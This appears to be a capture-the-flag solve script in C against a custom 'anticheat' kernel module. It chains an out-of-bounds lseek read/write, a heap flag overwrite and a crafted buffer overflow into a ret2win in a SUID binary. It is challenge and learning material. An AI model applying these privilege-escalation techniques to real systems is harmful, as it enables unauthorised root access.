// solve script if you wanna do it the hard way instead of with the 2nd cheese
// https://kqx.io/post/qemu-nday/
// (HELP ME)

#include <stdio.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <unistd.h>
#include <signal.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>

// IOCTL stuff
# define BLOCK_FD _IO(69, 0)
# define LOCK_SECRET _IO(69, 1)
# define KPROBE_SECURITY_CHECK _IO(69, 2)

// size of the secret
#define SECRET_SIZE 0x50

// maximum FDS to block
#define MAX_FD_TO_BLOCK 20

// Linux Kernel v6.16

// perform the lseek exploit to get right at secret_locked
void perform_lseek(int fd) {
	off_t lseek_amnt = lseek(fd, SECRET_SIZE+4 + sizeof(int)*MAX_FD_TO_BLOCK, SEEK_SET);
	printf("Seeked %u\n", lseek_amnt);
}

// this will be responsible for overwriting the SUID process' heap
void overwrite_heap() {
	// open the anticheat
	int ac = open("/proc/anticheat", O_RDWR, 2);
	assert(ac != -1);
	puts("Behind chunk initialized!!");

	// wait a bit for the other chunks to initialize
	sleep(2);

	// perform the lseek() vulnerability to access the secret_locked value and disable it
	// do size+4 first because we can't do size (it sets our num bytes to read to 0)
	// it also skips past the 4-byte header of the chunk
	// we land right in the blocked_fds table
	// we then add sizeof(int)*MAX_FDs to pass the table and enter the secrets_locked variable
	perform_lseek(ac);

	// first, to see if we're in the right area, test a read
	char buf[SECRET_SIZE] = {0};
	int num_read = read(ac, buf, SECRET_SIZE); // we're forced to use MAX_SIZE anyway, so why not
	if(num_read == -1) {
		perror("Reading to buffer as test");
		exit(-1);
	}

	// get the integer, make sure it's 1
	int* buf_ints = (int*)buf;
	if(buf_ints[0] != 1) {
		printf("Not 1; but instead %d\n", buf_ints[0]);
		exit(-1);
	}

	// set to 0 and seek back to original position
	buf_ints[0] = 0;
	perform_lseek(ac);

	// modify the chunk
	int written = write(ac, buf, SECRET_SIZE); // we're forced to use MAX_SIZE anyway, so why not
	if(written == -1) {
		perror("Writing to secret_locked");
		exit(-1);
	}

	// we're done! we honestly don't need this process anymore
	printf("Wrote %d\n", written);
	exit(0);
}

int main() {
	/*
		firstly, the kmod lseek() is vulnerable. with SEEK_SET, we can set an arbitrary offset

		secondly, in the OOB protection get_blk_if_safe()
			the num = min(x,x) statement works up UNTIL offset==MAX

		if (offset > MAX) (say, offset==MAX+1), then
			num=min(MAX,(size_t)([NEGATIVE_VALUE]))

		negative values represented in unsigned values wrap to being insanely huge
		thus, the min statement always defaults to MAX
	*/

	// do an initial fork to get a chunk BEFORE the SUID program
	// have the child handle overwriting the SUID program's anticheat_blk
	// this is essentially to disable the secret from being locked (so we can perform our stack attack)
	int res = fork();
	if(res == 0) overwrite_heap();

	// wait a bit to make sure the kernel put the above child's chunk on the heap
	sleep(1);

	// now, do another fork
	// this time, have the child open the SUID program
	res = fork();
	if(res == 0) {
		// get the command to execute
		// dynamically execute it, put the proper lseek amount
		char* cmd = NULL;
		asprintf(&cmd, "(sleep 5; echo %d) | /home/amels/example1", (int)(SECRET_SIZE+4));

		// execute
		system(cmd);
		free(cmd);
		exit(0);
	}

	// wait for the SUID program to initialize on the heap
	sleep(1);

	/* 

	this part will be pretty simple
	the end goal is for us to exploit the lseek() vuln ON THE SUID PROGRAM

	remember that, as stated above, (offset>MAX) means we will be forced to read MAX bytes!

	in the SUID program, when it reads, it will be forced to overflow its buffer (thx to kernel)
	and it will read OOB into the next cache chunk (this chunk)'s blocking_fds table
	so, we can format the blocking_fds table

	it will be treated like a char* array, thus we can specifically craft "integers" that are
	actually just the payload for the buffer overflow

	we will be able to modify RIP to perform a ret2win

	*/

	// create an anticheat handle
	int ac = open("/proc/anticheat", O_RDWR, 2);

	// our BOF payload
	// create a buffer to hold the file descriptor table values as a char array
	unsigned char payload[MAX_FD_TO_BLOCK * sizeof(int)];
	memset(payload, 1, sizeof(payload));

	// first, create the junk data to write
	// open the binary in ghidra to find this
	int num_junk_data = 0x36;

	// now, set RIP to the proper location
	// remember, the binary has PIE enabled (this is already complicated enough)
	unsigned long* addr_location = (unsigned long*)(payload + num_junk_data);
	addr_location[0] = 0x004011f6; //location to jump to within binary

	// go ahead and write the file descriptors
	int* fd_table = (int*)(payload);
	for(int i = 0; i < MAX_FD_TO_BLOCK; i++) {
		// the kernel module will disregard our request silently if we already have an FD
		// so, if we see 16843009 (basically part of the junk data)
		// just do a random number
		int fd = fd_table[i];
		if(fd == 16843009) fd = (int)rand();

		// write it
		printf("Writing FD %d, setting to %d\n", i, fd);
		int res = ioctl(ac, BLOCK_FD, (unsigned long)fd);
		if(res == -1) {
			perror("Setting FD");
			return -1;
		}
	}

	// we're done with this chunk
	puts("Done setting FDs!");
	system("cat /proc/anticheat-status");

	// we're done, now we stall
	while(1) {}
	return 0;
}